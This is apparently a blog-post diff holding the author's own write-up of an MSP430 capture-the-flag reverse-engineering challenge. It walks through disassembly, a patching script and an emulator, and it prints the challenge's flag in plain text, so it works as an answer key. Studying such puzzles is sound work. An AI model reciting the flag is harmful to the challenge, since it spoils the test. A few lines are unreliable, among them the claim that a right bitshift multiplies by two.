+    <span class="n">c6f8</span><span class="o">:</span>	<span class="mi">3</span><span class="n">e</span> <span class="mi">40</span> <span class="mi">34</span> <span class="mi">52</span> 	<span class="n">mov</span>	<span class="err">#</span><span class="mi">21044</span><span class="p">,</span>	<span class="n">r14</span>	<span class="p">;</span><span class="err">#</span><span class="mh">0x5234</span>
+    <span class="n">c6fc</span><span class="o">:</span>	<span class="mi">0</span><span class="n">e</span> <span class="mi">12</span>       	<span class="n">push</span>	<span class="n">r14</span>		<span class="p">;</span>
+    <span class="n">c6fe</span><span class="o">:</span>	<span class="mi">3</span><span class="n">e</span> <span class="mi">40</span> <span class="mo">04</span> <span class="n">e4</span> 	<span class="n">mov</span>	<span class="err">#</span><span class="o">-</span><span class="mi">7164</span><span class="p">,</span>	<span class="n">r14</span>	<span class="p">;</span><span class="err">#</span><span class="mh">0xe404</span>
+    <span class="n">c702</span><span class="o">:</span>	<span class="mi">0</span><span class="n">e</span> <span class="mi">12</span>       	<span class="n">push</span>	<span class="n">r14</span>		<span class="p">;</span>
+</code></pre></div></div>
+
+<p>(list cut for brevity)</p>
+
+<p>and finally we reach this <code class="language-plaintext highlighter-rouge">br</code> instruction:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nl">c704:</span>	<span class="mo">00</span> <span class="mi">41</span>       	<span class="n">br</span>	<span class="n">r1</span>		<span class="p">;</span>
+</code></pre></div></div>
+
+<p><code class="language-plaintext highlighter-rouge">br</code> is equivalent to <code class="language-plaintext highlighter-rouge">mov.w r1, r0</code>: essentially, we are <code class="language-plaintext highlighter-rouge">mov</code>ing the addresses from <code class="language-plaintext highlighter-rouge">r1</code> into <code class="language-plaintext highlighter-rouge">r0</code>. since that’s the stack pointer and the program counter, we’re essentially going to <em>execute</em> the contents of the stack! meaning, the whole list of <code class="language-plaintext highlighter-rouge">mov</code> and <code class="language-plaintext highlighter-rouge">push</code> instructions contain actual <em>code</em> that will be executed!</p>
+
+<p>the next step is to disassemble the dynamically loaded shellcode. there’s a few ways to do this. to be honest i would just patch the binary w/ nops and let the objdump disassembler do the rest of the work, but there are some caveats with doing this:</p>
+
+<p>because the stack grows downward and the program counter goes upwards, this means the very <em>last</em> instruction pushed onto the stack is the first one executed, and the very first instruction pushed onto the stack is the last one executed. a stack is LIFO, after all, so this should be intuitive.</p>
+
+<p>anyways let’s view a hexdump so we can better see what we’re working with. we want to access the bytecode and bytecode only, and leave everything else untouched. we can crossref with the <code class="language-plaintext highlighter-rouge">objdump</code> output as well, noting that we <em>should</em> see an <code class="language-plaintext highlighter-rouge">0d40</code> as our beginning instruction.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[-$ xxd rev.bin                    
+00000000: 7f45 4c46 0101 01ff 0000 0000 0000 0000  .ELF............
+00000010: 0200 6900 0100 0000 00c0 0000 3400 0000  ..i.........4...
+00000020: cc07 0000 2d00 0000 3400 2000 0200 2800  ....-...4. ...(.
+00000030: 0500 0400 0100 0000 0000 0000 8cbf 0000  ................
+00000040: 8cbf 0000 8407 0000 8407 0000 0500 0000  ................
+00000050: 0400 0000 0100 0000 8607 0000 feff 0000  ................
+00000060: feff 0000 0200 0000 0200 0000 0400 0000  ................
+00000070: 0400 0000 [0d40] 3140 0020 0f41 3e40 004d  .....@1@. .A&gt;@.M
+00000080: 0e12 3e40 0343 0e12 3e40 2b52 0e12 3e40  ..&gt;@.C..&gt;@+R..&gt;@
+00000090: 0b5b 0e12 3e40 0b5b 0e12 3e40 0b5b 0e12  .[..&gt;@.[..&gt;@.[..
+000000a0: 3e40 2b52 0e12 3e40 0b5b 0e12 3e40 0b5b  &gt;@+R..&gt;@.[..&gt;@.[
+000000b0: 0e12 3e40 0b5b 0e12 3e40 2b82 0e12 3e40  ..&gt;@.[..&gt;@+...&gt;@
+000000c0: 3b82 0e12 3e40 0b5b 0e12 3e40 0b5b 0e12  ;...&gt;@.[..&gt;@.[..
+000000d0: 3e40 0b5b 0e12 3e40 0b5b 0e12 3e40 0b5b  &gt;@.[..&gt;@.[..&gt;@.[
+000000e0: 0e12 3e40 0b5b 0e12 3e40 3b52 0e12 3e40  ..&gt;@.[..&gt;@;R..&gt;@
+000000f0: 0beb 0e12 3e40 1a83 0e12 3e40 2a52 0e12  ....&gt;@....&gt;@*R..
+00000100: 3e40 0a5a 0e12 3e40 0a5a 0e12 3e40 0a5a  &gt;@.Z..&gt;@.Z..&gt;@.Z
+00000110: 0e12 3e40 2a53 0e12 3e40 3a52 0e12 3e40  ..&gt;@*S..&gt;@:R..&gt;@
+00000120: 0a5a 0e12 3e40 0a5a 0e12 3e40 0a5a 0e12  .Z..&gt;@.Z..&gt;@.Z..
+</code></pre></div></div>
+
+<p>in the above dump i’ve wrapped the <code class="language-plaintext highlighter-rouge">0d40</code> instruction in brackets - so we know that that’s where execution begins. essentially, what we want is to patch out every <code class="language-plaintext highlighter-rouge">3e40</code> instruction (which is a <code class="language-plaintext highlighter-rouge">mov.w r14</code>) and leave <em>only</em> the word that is actually being pushed.</p>
+
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">subprocess</span>
+
+<span class="n">binary_bytes</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s">'rev.bin'</span><span class="p">,</span> <span class="s">'rb'</span><span class="p">).</span><span class="n">read</span><span class="p">()</span>
+<span class="n">patched_bytes</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="n">binary_bytes</span><span class="p">)</span>
+
+<span class="k">for</span> <span class="n">idx</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">binary_bytes</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">2</span><span class="p">):</span>
+    <span class="n">word</span> <span class="o">=</span> <span class="n">binary_bytes</span><span class="p">[</span><span class="n">idx</span><span class="p">:</span><span class="n">idx</span><span class="o">+</span><span class="mi">2</span><span class="p">].</span><span class="nb">hex</span><span class="p">()</span>
+    <span class="k">if</span> <span class="n">word</span> <span class="o">==</span> <span class="s">'3e40'</span> <span class="ow">or</span> <span class="n">word</span><span class="o">==</span><span class="s">'0e12'</span><span class="p">:</span>
+        <span class="n">patched_bytes</span><span class="p">[</span><span class="n">idx</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x03</span> <span class="c1"># this is a nop
+</span>        <span class="n">patched_bytes</span><span class="p">[</span><span class="n">idx</span><span class="o">+</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x43</span>
+
+<span class="n">patched_binary</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s">'rev_patched.bin'</span><span class="p">,</span> <span class="s">'wb'</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>above is the script i used. patching out the <code class="language-plaintext highlighter-rouge">push</code> and <code class="language-plaintext highlighter-rouge">mov</code> instructions and disassembling, we get the following:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nl">c6d6:</span>       <span class="mo">04</span> <span class="mi">54</span>           <span class="n">rla</span>     <span class="n">r4</span>              <span class="p">;</span>
+<span class="n">c6dc</span><span class="o">:</span>       <span class="mo">04</span> <span class="mi">54</span>           <span class="n">rla</span>     <span class="n">r4</span>              <span class="p">;</span>
+<span class="n">c6e2</span><span class="o">:</span>       <span class="mi">24</span> <span class="mi">82</span>           <span class="n">sub</span>     <span class="err">#</span><span class="mi">4</span><span class="p">,</span>     <span class="n">r4</span>      <span class="p">;</span><span class="n">r2</span> <span class="n">As</span><span class="o">==</span><span class="mi">10</span>
+<span class="n">c6e8</span><span class="o">:</span>       <span class="mo">04</span> <span class="mi">54</span>           <span class="n">rla</span>     <span class="n">r4</span>              <span class="p">;</span>
+<span class="n">c6ee</span><span class="o">:</span>       <span class="mo">04</span> <span class="mi">54</span>           <span class="n">rla</span>     <span class="n">r4</span>              <span class="p">;</span>
+<span class="n">c6f4</span><span class="o">:</span>       <span class="mo">04</span> <span class="mi">54</span>           <span class="n">rla</span>     <span class="n">r4</span>              <span class="p">;</span>
+<span class="n">c6fa</span><span class="o">:</span>       <span class="mi">34</span> <span class="mi">52</span>           <span class="n">add</span>     <span class="err">#</span><span class="mi">8</span><span class="p">,</span>     <span class="n">r4</span>      <span class="p">;</span><span class="n">r2</span> <span class="n">As</span><span class="o">==</span><span class="mi">11</span>
+<span class="n">c700</span><span class="o">:</span>       <span class="mo">04</span> <span class="n">e4</span>           <span class="n">xor</span>     <span class="n">r4</span><span class="p">,</span>     <span class="n">r4</span>      <span class="p">;</span>
+<span class="n">c702</span><span class="o">:</span>       <span class="mo">03</span> <span class="mi">43</span>           <span class="n">nop</span>
+<span class="n">c704</span><span class="o">:</span>       <span class="mo">00</span> <span class="mi">41</span>           <span class="n">br</span>      <span class="n">r1</span>              <span class="p">;</span>
+</code></pre></div></div>
+
+<p>oh! we have valid bytecode! we have edits to registers!!! woohoo! yipee! we know what its doing now!! woohoo!!!</p>
+
+<p>keep in mind that the commands are LIFO so we need to read it from the bottom up. but we can see that there’s a clear to the <code class="language-plaintext highlighter-rouge">r4</code> register, and then we do various arithmetic operations.</p>
+
+<p>and then…</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nl">c00a:</span>       <span class="mo">00</span> <span class="mi">4</span><span class="n">d</span>           <span class="n">br</span>      <span class="n">r13</span>             <span class="p">;</span>
+<span class="n">c016</span><span class="o">:</span>       <span class="mi">2</span><span class="n">b</span> <span class="mi">52</span>           <span class="n">add</span>     <span class="err">#</span><span class="mi">4</span><span class="p">,</span>     <span class="n">r11</span>     <span class="p">;</span><span class="n">r2</span> <span class="n">As</span><span class="o">==</span><span class="mi">10</span>
+<span class="n">c01c</span><span class="o">:</span>       <span class="mi">0</span><span class="n">b</span> <span class="mi">5</span><span class="n">b</span>           <span class="n">rla</span>     <span class="n">r11</span>             <span class="p">;</span>
+<span class="n">c022</span><span class="o">:</span>       <span class="mi">0</span><span class="n">b</span> <span class="mi">5</span><span class="n">b</span>           <span class="n">rla</span>     <span class="n">r11</span>             <span class="p">;</span>
+<span class="n">c028</span><span class="o">:</span>       <span class="mi">0</span><span class="n">b</span> <span class="mi">5</span><span class="n">b</span>           <span class="n">rla</span>     <span class="n">r11</span>             <span class="p">;</span>
+<span class="n">c02e</span><span class="o">:</span>       <span class="mi">2</span><span class="n">b</span> <span class="mi">52</span>           <span class="n">add</span>     <span class="err">#</span><span class="mi">4</span><span class="p">,</span>     <span class="n">r11</span>     <span class="p">;</span><span class="n">r2</span> <span class="n">As</span><span class="o">==</span><span class="mi">10</span>
+<span class="n">c034</span><span class="o">:</span>       <span class="mi">0</span><span class="n">b</span> <span class="mi">5</span><span class="n">b</span>           <span class="n">rla</span>     <span class="n">r11</span>             <span class="p">;</span>
+<span class="n">c03a</span><span class="o">:</span>       <span class="mi">0</span><span class="n">b</span> <span class="mi">5</span><span class="n">b</span>           <span class="n">rla</span>     <span class="n">r11</span>             <span class="p">;</span>
+</code></pre></div></div>
+
+<p>that <code class="language-plaintext highlighter-rouge">br r13</code> just tells us we’re swapping control flow back to the address stored in r13. if we recall, the content stored in <code class="language-plaintext highlighter-rouge">r13</code> is just…</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nl">c000:</span>       <span class="mi">0</span><span class="n">d</span> <span class="mi">40</span>           <span class="n">mov</span>     <span class="n">r0</span><span class="p">,</span>     <span class="n">r13</span>     <span class="p">;</span>
+</code></pre></div></div>
+
+<p>it’s just the original pc from the main program flow! so this just moves us back into the start of the original program, and the program enters an infinite loop!</p>
+
+<p>so now, where do we get the flag? this is the part of the chal that might be a little ‘guessy’ but given the msp430 has no builtin input/output functionality, i couldn’t just write a flagchecker that accepts input from a terminal (believe me, i’ve tried! the school has not been able to give me the necessary devices for UART unfortunately, i wouldve loved to implement this in the chal)</p>
+
+<p>given that we’re altering the registers, why don’t we just figure out what the values of each register would be after the program execution? registers <code class="language-plaintext highlighter-rouge">r4</code> to <code class="language-plaintext highlighter-rouge">r11</code> are modified twice in the shellcode loop with the arithmetic operations, so we can basically just write an ‘emulator’ of sorts to figure out what the operations are actually doing.</p>
+
+<p>there’s <code class="language-plaintext highlighter-rouge">add</code>s and <code class="language-plaintext highlighter-rouge">sub</code>s which are quite straightforward. we also only use the numbers 1, 2, 4, 8 bc of the msp430’s constant generator register, which is not entirely necessary to know (but that’s why the instructions are able to fit in a word each).</p>
+
+<p>the other thing that might be confusing is the <code class="language-plaintext highlighter-rouge">rla</code> instruction (rotate left), which rotates the bits in the register one position to the left. as we all know a bitshift to the right is equivalent to multiplying by two - so, all the register ops amount to is just adds, muls, and subs.</p>
+
+<p>now we will work on actually emulating the instructions by parsing the raw bytes. let’s eyepower some of these - of course, you can breakdown the individual bits that make up the instructions and actually that would be a lot more elucidatory but shhhhhhhhhhhh:</p>
+
+<h3 id="rla">rla:</h3>
+
+<p>this one’s easy because it’s always a shift by so we don’t need to worry about parsing constants.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="mo">04</span> <span class="mi">54</span>           <span class="n">rla</span>     <span class="n">r4</span>
+<span class="mo">05</span> <span class="mi">55</span>           <span class="n">rla</span>     <span class="n">r5</span>
+<span class="mo">06</span> <span class="mi">56</span>           <span class="n">rla</span>     <span class="n">r6</span>
+<span class="mo">07</span> <span class="mi">57</span>           <span class="n">rla</span>     <span class="n">r7</span>
+</code></pre></div></div>
+
+<p>here is some example instructions i pulled from the binary - i hope the pattern is immediately obvious, where the instr format is <code class="language-plaintext highlighter-rouge">0x5x</code> with <code class="language-plaintext highlighter-rouge">x</code> being the number of the register in hexadecimal.</p>
+
+<h3 id="add">add:</h3>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="mi">1</span><span class="n">a</span> <span class="mi">53</span>           <span class="n">inc</span>     <span class="n">r10</span>             <span class="p">;</span>
+<span class="mi">2</span><span class="n">b</span> <span class="mi">53</span>           <span class="n">incd</span>    <span class="n">r11</span>             <span class="p">;</span>
+<span class="mi">2</span><span class="n">c</span> <span class="mi">52</span>           <span class="n">add</span>     <span class="err">#</span><span class="mi">4</span><span class="p">,</span>     <span class="n">r12</span>     <span class="p">;</span><span class="n">r2</span> <span class="n">As</span><span class="o">==</span><span class="mi">10</span>
+<span class="mi">3</span><span class="n">d</span> <span class="mi">52</span>           <span class="n">add</span>     <span class="err">#</span><span class="mi">8</span><span class="p">,</span>     <span class="n">r13</span>     <span class="p">;</span><span class="n">r2</span> <span class="n">As</span><span class="o">==</span><span class="mi">11</span>
+</code></pre></div></div>
+
+<p>so add1 and add2 actually get optimised into these <code class="language-plaintext highlighter-rouge">inc</code> and <code class="language-plaintext highlighter-rouge">incd</code> instructions, with the opcode being <code class="language-plaintext highlighter-rouge">53</code> instead of <code class="language-plaintext highlighter-rouge">52</code> for generic <code class="language-plaintext highlighter-rouge">add</code>s. the general format is this:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp"># inc
+</span><span class="mi">53</span> <span class="o">------</span> <span class="mi">1</span><span class="n">a</span> <span class="o">------</span> <span class="p">(</span><span class="n">little</span> <span class="n">endian</span><span class="p">)</span>
+<span class="mo">0101</span> <span class="mo">0011</span> <span class="mo">0001</span> <span class="mi">1010</span>
+<span class="o">|</span>
+<span class="mo">0101</span> <span class="mo">0011</span> <span class="o">-&gt;</span> <span class="n">opcode</span> <span class="k">for</span> <span class="n">inc</span> 
+<span class="mo">0001</span> <span class="o">-&gt;</span> <span class="n">corresponds</span> <span class="n">to</span> <span class="n">the</span> <span class="n">increment</span> <span class="n">amount</span><span class="p">.</span> <span class="k">for</span> <span class="n">inc</span><span class="p">,</span> <span class="n">we</span> <span class="n">sjut</span> <span class="n">take</span> <span class="n">this</span> <span class="n">value</span> <span class="n">as</span> <span class="n">is</span>
+<span class="mi">1010</span> <span class="o">-&gt;</span> <span class="k">register</span> <span class="n">number</span> <span class="n">in</span> <span class="n">hex</span>
+
+<span class="cp">#add
+</span><span class="mi">52</span> <span class="o">------</span> <span class="mi">2</span><span class="n">c</span> <span class="o">------</span>
+<span class="mo">0101</span> <span class="mo">0010</span> <span class="mo">0010</span> <span class="mi">1100</span>
+
+<span class="mo">0101</span> <span class="mo">0011</span> <span class="o">-&gt;</span> <span class="n">opcode</span> <span class="k">for</span> <span class="n">add</span>
+<span class="mo">0010</span> <span class="o">-&gt;</span> <span class="n">corresponds</span> <span class="n">to</span> <span class="n">the</span> <span class="n">increment</span> <span class="n">amount</span><span class="p">.</span> <span class="n">we</span> <span class="n">take</span> <span class="n">this</span> <span class="n">as</span> <span class="n">an</span> <span class="n">exponent</span> <span class="n">to</span> <span class="mi">2</span> <span class="n">before</span> <span class="n">adding</span>
+<span class="mi">1100</span> <span class="o">-&gt;</span> <span class="k">register</span> <span class="n">number</span> <span class="n">in</span> <span class="n">hex</span>
+</code></pre></div></div>
+
+<p>i hope that this is reasonable to understand. we can also exactly apply this to <code class="language-plaintext highlighter-rouge">decd</code> and <code class="language-plaintext highlighter-rouge">sub</code>, it’s the exact same idea:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="mi">15</span> <span class="mi">83</span>           <span class="n">dec</span>     <span class="n">r5</span>              <span class="p">;</span>
+<span class="mi">26</span> <span class="mi">83</span>           <span class="n">decd</span>    <span class="n">r6</span>              <span class="p">;</span>
+<span class="mi">27</span> <span class="mi">82</span>           <span class="n">sub</span>     <span class="err">#</span><span class="mi">4</span><span class="p">,</span>     <span class="n">r7</span>      <span class="p">;</span><span class="n">r2</span> <span class="n">As</span><span class="o">==</span><span class="mi">10</span>
+<span class="mi">38</span> <span class="mi">82</span>           <span class="n">sub</span>     <span class="err">#</span><span class="mi">8</span><span class="p">,</span>     <span class="n">r8</span>      <span class="p">;</span><span class="n">r2</span> <span class="n">As</span><span class="o">==</span><span class="mi">11</span>
+</code></pre></div></div>
+
+<p>we can see that it’s the exact same! just with <code class="language-plaintext highlighter-rouge">83</code> and <code class="language-plaintext highlighter-rouge">82</code> as opcodes instead.
+honestly, armed with this, we’re literally already done and can write an emulator. let’s do that.</p>
+
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">binary_bytes</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s">'rev.bin'</span><span class="p">,</span> <span class="s">'rb'</span><span class="p">).</span><span class="n">read</span><span class="p">()</span>
+<span class="n">regs</span> <span class="o">=</span> <span class="p">[</span><span class="mi">0</span> <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mh">0xf</span><span class="p">)]</span>
+
+<span class="n">opcodes</span> <span class="o">=</span> <span class="p">{</span>
+
+    <span class="mh">0x54</span><span class="p">:</span> <span class="k">lambda</span> <span class="n">reg</span><span class="p">,</span> <span class="n">val</span><span class="p">:</span> <span class="n">reg</span><span class="o">&lt;&lt;</span><span class="mi">1</span><span class="p">,</span>          <span class="c1"># rla
+</span>    <span class="mh">0x53</span><span class="p">:</span> <span class="k">lambda</span> <span class="n">reg</span><span class="p">,</span> <span class="n">val</span><span class="p">:</span> <span class="n">reg</span> <span class="o">+</span> <span class="n">val</span><span class="p">,</span>       <span class="c1"># inc
+</span>    <span class="mh">0x52</span><span class="p">:</span> <span class="k">lambda</span> <span class="n">reg</span><span class="p">,</span> <span class="n">val</span><span class="p">:</span> <span class="n">reg</span> <span class="o">+</span> <span class="p">(</span><span class="mi">2</span><span class="o">**</span><span class="n">val</span><span class="p">),</span>  <span class="c1"># add
+</span>    <span class="mh">0x83</span><span class="p">:</span> <span class="k">lambda</span> <span class="n">reg</span><span class="p">,</span> <span class="n">val</span><span class="p">:</span> <span class="n">reg</span> <span class="o">-</span> <span class="n">val</span><span class="p">,</span>       <span class="c1"># dec
+</span>    <span class="mh">0x82</span><span class="p">:</span> <span class="k">lambda</span> <span class="n">reg</span><span class="p">,</span> <span class="n">val</span><span class="p">:</span> <span class="n">reg</span> <span class="o">-</span> <span class="mi">2</span><span class="o">**</span><span class="n">val</span><span class="p">,</span>    <span class="c1"># sub
+</span>    <span class="mh">0xe4</span><span class="p">:</span> <span class="k">lambda</span> <span class="n">reg</span><span class="p">,</span> <span class="n">val</span><span class="p">:</span> <span class="n">reg</span> <span class="o">^</span> <span class="n">reg</span>        <span class="c1"># xor
+</span>
+<span class="p">}</span>
+
+<span class="n">prev_reg</span> <span class="o">=</span> <span class="mi">4</span>
+
+<span class="n">instructions</span> <span class="o">=</span> <span class="p">[]</span>
+
+<span class="k">for</span> <span class="n">idx</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">binary_bytes</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">2</span><span class="p">):</span>
+    <span class="n">word</span> <span class="o">=</span> <span class="n">binary_bytes</span><span class="p">[</span><span class="n">idx</span><span class="p">:</span><span class="n">idx</span><span class="o">+</span><span class="mi">2</span><span class="p">].</span><span class="nb">hex</span><span class="p">()</span>
+    <span class="k">if</span> <span class="n">word</span> <span class="o">==</span> <span class="s">'3e40'</span><span class="p">:</span>
+        <span class="n">instr_hex</span> <span class="o">=</span> <span class="n">binary_bytes</span><span class="p">[</span><span class="n">idx</span><span class="o">+</span><span class="mi">2</span><span class="p">:</span><span class="n">idx</span><span class="o">+</span><span class="mi">4</span><span class="p">].</span><span class="nb">hex</span><span class="p">()</span>
+        <span class="n">op</span><span class="p">,</span> <span class="n">arg</span> <span class="o">=</span> <span class="n">binary_bytes</span><span class="p">[</span><span class="n">idx</span><span class="o">+</span><span class="mi">3</span><span class="p">],</span> <span class="n">binary_bytes</span><span class="p">[</span><span class="n">idx</span><span class="o">+</span><span class="mi">2</span><span class="p">]</span>
+        <span class="n">value</span><span class="p">,</span> <span class="n">reg</span> <span class="o">=</span> <span class="p">(</span><span class="n">arg</span> <span class="o">&amp;</span> <span class="mb">0b11110000</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">4</span><span class="p">,</span> <span class="p">(</span><span class="n">arg</span> <span class="o">&amp;</span> <span class="mb">0b1111</span><span class="p">)</span>
+        <span class="c1"># gross patch
+</span>        <span class="k">if</span> <span class="mh">0x54</span> <span class="o">&lt;</span> <span class="n">op</span> <span class="o">&lt;</span> <span class="mh">0x60</span><span class="p">:</span> <span class="n">op</span> <span class="o">=</span> <span class="mh">0x54</span>
+        <span class="k">if</span> <span class="mh">0xe4</span> <span class="o">&lt;</span> <span class="n">op</span> <span class="o">&lt;</span> <span class="mh">0xf0</span><span class="p">:</span> <span class="n">op</span> <span class="o">=</span> <span class="mh">0xe4</span>
+        <span class="k">if</span> <span class="n">op</span> <span class="ow">in</span> <span class="n">opcodes</span><span class="p">:</span>
+            <span class="n">instructions</span><span class="p">.</span><span class="n">append</span><span class="p">((</span><span class="n">instr_hex</span><span class="p">,</span> <span class="n">op</span><span class="p">,</span> <span class="n">opcodes</span><span class="p">[</span><span class="n">op</span><span class="p">],</span> <span class="n">value</span><span class="p">,</span> <span class="n">reg</span><span class="p">))</span>
+
+<span class="n">prev_reg</span> <span class="o">=</span> <span class="mi">4</span>
+<span class="n">flag</span> <span class="o">=</span> <span class="sa">b</span><span class="s">''</span>
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">instructions</span><span class="p">[::</span><span class="o">-</span><span class="mi">1</span><span class="p">]:</span> <span class="c1"># we flip because of LIFO
+</span>    <span class="n">instr_hex</span><span class="p">,</span> <span class="n">op_num</span><span class="p">,</span> <span class="n">op</span><span class="p">,</span> <span class="n">value</span><span class="p">,</span> <span class="n">reg</span> <span class="o">=</span> <span class="n">i</span>
+    <span class="k">if</span> <span class="n">op_num</span> <span class="o">&gt;=</span> <span class="mh">0xe4</span><span class="p">:</span>
+        <span class="n">flag_chunk</span> <span class="o">=</span> <span class="n">regs</span><span class="p">[</span><span class="n">prev_reg</span><span class="p">].</span><span class="n">to_bytes</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="n">byteorder</span><span class="o">=</span><span class="s">'little'</span><span class="p">)</span>
+        <span class="n">flag</span> <span class="o">+=</span> <span class="n">flag_chunk</span>
+    <span class="n">regs</span><span class="p">[</span><span class="n">reg</span><span class="p">]</span> <span class="o">=</span> <span class="n">op</span><span class="p">(</span><span class="n">regs</span><span class="p">[</span><span class="n">reg</span><span class="p">],</span> <span class="n">value</span><span class="p">)</span>
+    <span class="n">prev_reg</span> <span class="o">=</span> <span class="n">reg</span>
+<span class="n">flag</span> <span class="o">+=</span> <span class="n">regs</span><span class="p">[</span><span class="n">prev_reg</span><span class="p">].</span><span class="n">to_bytes</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="n">byteorder</span><span class="o">=</span><span class="s">'little'</span><span class="p">)</span> 
+<span class="k">print</span><span class="p">(</span><span class="n">flag</span><span class="p">.</span><span class="n">decode</span><span class="p">(</span><span class="n">errors</span><span class="o">=</span><span class="s">'ignore'</span><span class="p">))</span>
+</code></pre></div></div>
+
+<p>so this will actually just print the flag but let’s go over some details that makes this work: the flag is calculated and stored as ascii bytes in the registers, and we iterate through registers 4 through 11 twice.</p>
+
+<p>i didn’t want to encode multiple ops for the <code class="language-plaintext highlighter-rouge">rla</code> and <code class="language-plaintext highlighter-rouge">xor</code> so i just patch it into mapping to the same op. also we have to account for the order of the bytes.</p>
+
+<p>to be honest it would be easier to parse the <code class="language-plaintext highlighter-rouge">objdump</code> output directly but this is more.. elucidatory i suppose. anyways yeah that’s basically it for the chal - just run that script and you get the answer.</p>
+
+<p>for completeness sake here is the script i used to write the actual binary dynamically. i was going to do it manually but i figured it would be a cool exercise to actually ‘write’ my own assembler (for a limited amount of opcodes, that is)</p>
+
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="n">flag</span> <span class="o">=</span> <span class="sa">b</span><span class="s">"CyberBlitz2025{d3@th_4nd_t3x&amp;s$}"</span>
+<span class="n">chunks</span> <span class="o">=</span> <span class="p">[</span><span class="n">flag</span><span class="p">[</span><span class="n">n</span><span class="p">:</span><span class="n">n</span><span class="o">+</span><span class="mi">2</span><span class="p">]</span> <span class="k">for</span> <span class="n">n</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">flag</span><span class="p">),</span> <span class="mi">2</span><span class="p">)]</span>
+<span class="n">func</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span><span class="p">:</span> <span class="nb">int</span><span class="p">.</span><span class="n">from_bytes</span><span class="p">(</span><span class="n">x</span><span class="p">,</span> <span class="n">byteorder</span><span class="o">=</span><span class="s">'little'</span><span class="p">)</span>
+<span class="n">flag_chunks</span> <span class="o">=</span> <span class="p">[</span><span class="o">*</span><span class="nb">map</span><span class="p">(</span><span class="n">func</span><span class="p">,</span> <span class="n">chunks</span><span class="p">)]</span>
+
+<span class="kn">from</span> <span class="nn">functools</span> <span class="kn">import</span> <span class="n">lru_cache</span>
+
+<span class="n">CONSTS</span> <span class="o">=</span> <span class="p">[</span><span class="mi">8</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">1</span><span class="p">]</span>
+
+<span class="kn">from</span> <span class="nn">collections</span> <span class="kn">import</span> <span class="n">deque</span>
+
+<span class="n">CONSTS</span> <span class="o">=</span> <span class="p">[</span><span class="mi">8</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">1</span><span class="p">]</span>
+<span class="n">OPS</span> <span class="o">=</span> <span class="p">[</span><span class="s">'+'</span><span class="p">,</span> <span class="s">'-'</span><span class="p">,</span> <span class="s">'*'</span><span class="p">]</span>
+
+<span class="k">def</span> <span class="nf">eval_op</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">op</span><span class="p">,</span> <span class="n">b</span><span class="p">):</span>
+    <span class="k">if</span> <span class="n">op</span> <span class="o">==</span> <span class="s">'+'</span><span class="p">:</span> <span class="k">return</span> <span class="n">a</span> <span class="o">+</span> <span class="n">b</span>
+    <span class="k">if</span> <span class="n">op</span> <span class="o">==</span> <span class="s">'-'</span><span class="p">:</span> <span class="k">return</span> <span class="n">a</span> <span class="o">-</span> <span class="n">b</span>
+    <span class="k">if</span> <span class="n">op</span> <span class="o">==</span> <span class="s">'*'</span><span class="p">:</span> <span class="k">return</span> <span class="n">a</span> <span class="o">*</span> <span class="n">b</span>
+    <span class="k">raise</span> <span class="nb">ValueError</span><span class="p">(</span><span class="n">op</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">eval_left_to_right</span><span class="p">(</span><span class="n">expr</span><span class="p">):</span>
+    <span class="s">"""Evaluate expression left-to-right without operator precedence"""</span>
+    <span class="n">tokens</span> <span class="o">=</span> <span class="p">[]</span>
+    <span class="n">current</span> <span class="o">=</span> <span class="s">''</span>
+    
+    <span class="c1"># Tokenize the expression
+</span>    <span class="k">for</span> <span class="n">char</span> <span class="ow">in</span> <span class="n">expr</span><span class="p">:</span>
+        <span class="k">if</span> <span class="n">char</span> <span class="ow">in</span> <span class="s">'+-*'</span><span class="p">:</span>
+            <span class="k">if</span> <span class="n">current</span><span class="p">:</span>
